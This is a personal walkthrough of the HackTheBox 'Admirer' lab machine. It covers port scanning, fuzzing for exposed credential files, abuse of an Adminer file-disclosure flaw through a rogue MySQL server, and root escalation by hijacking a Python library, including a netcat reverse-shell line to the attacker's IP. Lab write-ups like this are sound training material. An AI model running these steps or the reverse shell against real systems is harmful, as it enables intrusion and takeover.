Admirer

1. nmap:

nmap -p- --min-rate=1000 -T4 10.10.10.187

Nmap scan report for 10.10.10.187
Host is up (0.041s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

kali@kali:~/labs/hackthebox$ sudo nmap -sV -O -A  10.10.10.187

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-01 17:41 EDT
Nmap scan report for 10.10.10.187
Host is up (0.034s latency).
Not shown: 997 closed ports

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/1%OT=21%CT=1%CU=33024%PV=Y%DS=2%DC=T%G=Y%TM=5EFD031C
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=8)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   34.00 ms 10.10.14.1
2   34.04 ms 10.10.10.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.21 seconds

---
Can see the page source: pagesource.txt

There is a form in there that can't POST anything.

Reading nmap output, found a robots.txt file, check that:

view-source:http://10.10.10.187/robots.txt
Output -

User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir

So we know there is a directory called /admin-dir that we cannot currently access.

There's a name here, waldo (potential username), lets run hydra on that:
Nothing.

Try finding files inside the /admin-dir directory:

kali@kali:/usr/share/seclists$ wfuzz -u http://10.10.10.187/admin-dir/FUZZ.txt -w /usr/share/seclists/Discovery/Web-Content/big.txt --sc 200

Output:
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.187/admin-dir/FUZZ.txt
Total requests: 20473

===================================================================
ID           Response   Lines    Word     Chars       Payload                                          
===================================================================

000005198:   200        29 L     39 W     350 Ch      "contacts"                                       
000005443:   200        11 L     13 W     136 Ch      "credentials"                                    

Total time: 79.48755
Processed Requests: 20473
Filtered Requests: 20471
Requests/sec.: 257.5623

2 files found, `contacts`, `credentials`.

view-source:http://10.10.10.187/admin-dir/contacts.txt:

##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb


view-source:http://10.10.10.187/admin-dir/credentials.txt:

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!

---
We now have an FTP account, let's log in:

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.

Make local FTP file download directory:
`lcd /home/kali/labs/hackthebox/Admirer/`

get both files:

`get dump.sql
get html.tar.gz`

Open dump.sql using cat, nothing in there (just info displayed on the site).

Open html.tar.gz:
extract html.tar.gz --> extract is a function on my Kali machine, to allow for all file types to be extracted.

2 Folders extracted that are new:
1. utility-scripts
admin_tasks.php - Contains administrative tasks

db_admin.php - Contains SQL server username + password:
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

2. w4ld0s_s3cr3t_d1r

File credentials.txt had the following extra:

[Bank Account]
waldo.11
Ezy]m27}OREc$

---
Try to access db_admin.php, admin_tasks.php from website:

Cannot access db_admin.php
Can access admin_tasks.php, but can't manipulate packets.

Decided to search for more files in utility-scripts:

wfuzz -u http://10.10.10.187/utility-scripts/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/big.txt --sc 200

Output:

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.187/utility-scripts/FUZZ.php
Total requests: 20473

===================================================================
ID           Response   Lines    Word     Chars       Payload                                          
===================================================================

000001873:   200        51 L     235 W    4158 Ch     "adminer"                                        
000009618:   200        964 L    4976 W   84074 Ch    "info"                                           
000013868:   200        0 L      8 W      32 Ch       "phptest"                                        

Total time: 79.45862
Processed Requests: 20473
Filtered Requests: 20470
Requests/sec.: 257.6560


Found a php called adminer, let's take a look:
http://10.10.10.187/utility-scripts/adminer.php
Takes us to a Login page.

Let's try server, username, password above.
Output: Invalid user+password.

Looking for Adminer 4.6.2 vulnerabilities + exploits:
https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability

Major vulnerability up to 4.6.2. Steps to take:

1. Create MySQL server on attacker machine.

sudo /etc/init.d/mysql start
sudo mysql
CREATE DATABASE adminer-exploit;
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| adminer_exploit    |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.000 sec)

USE adminer_exploit;
CREATE TABLE dmp(content varchar(5000));
SHOW TABLES;
+---------------------------+
| Tables_in_adminer_exploit |
+---------------------------+
| dmp                       |
+---------------------------+
1 row in set (0.000 sec)

DESCRIBE dmp;
+---------+---------------+------+-----+---------+-------+
| Field   | Type          | Null | Key | Default | Extra |
+---------+---------------+------+-----+---------+-------+
| content | varchar(5000) | YES  |     | NULL    |       |
+---------+---------------+------+-----+---------+-------+

CREATE user 'demo'@'%' IDENTIFIED BY 'demo_admirer';
- This means, user = demo@[any], password = demo_admirer

GRANT ALL PRIVILEGES ON * . * TO 'demo'@'%';
- Grant all privileges to it

FLUSH PRIVILEGES;

Edit /etc/mysql/mariadb.conf.d/50-server.cnf :
Change bind-address to 0.0.0.0
(Allows us to connect to it through the adminer)
sudo systemctl restart mysql


2. Log in to MySQL db on Adminer:
System = MySQL
Server = 10.10.14.24 (local OpenVPN IP Address)
Username = demo
Password = demo_admirer
Database = adminer_exploit

3. Click on `SQL command`, type in:

load data local infile '[file]'
into table [table name]
fields terminated by "\n"

Tried searching for long ones but open_basedir limits root path, so instead we'll search for index.php:

load data local infile '../index.php'
into table dmp
fields terminated by "/n"

4. Click on `select` on the lhs, before your table name, and you'll see the dumped info.

$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";

Found a username + password for waldo, try SSH:

ssh waldo@10.10.10.187, with above Password

We're in!

waldo@admirer:~$ cat user.txt
afbf0403b947407d92e33564f64f934a

---
Find root.txt:

waldo@admirer:~$ sudo -l
[sudo] password for waldo:
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh

See backup.py, admin_tasks.sh.
admin_tasks.sh:
- Runs the backup.py script in this directory when run.
- Can be run as root.

backup.py:
- Has a method calling make_archive() from shutil.
- When run with admin_tasks.sh, will run as root as well.

Searching on the internet, I found a method by which you can hijack this. We will be creating a new shutil, with a new method make_archive that will run a netcat listener that we can connect to. (I wonder if you can do that but just with python).

1. Create shutil.py

By creating this, and running the admin_tasks.sh file directing it to this shutil, we should be able to run OUR make_archive method, instead of the original.

cd /tmp
nano shutil.py

Write the following:

import os

def make_archive (q,w,e):
        os.system('nc 10.10.14.24 4444 -e "/bin/bash"')

- make_archive still needs 3 values, since the backup.py file supplies 3 values (so we don't get an error).

On my VM I run:

nc -lvnp 4444 10.10.10.187

On Waldo's machine I run:

sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh
Choose option 6

Then run:
python -c 'import pty;pty.spawn("/bin/bash")'

and we have a reverse shell!

root@admirer:~# cat root.txt
cat root.txt
7ce62b0f0487ea8b0f806265b0242b4d

https://atsika.info/htb-admirer/
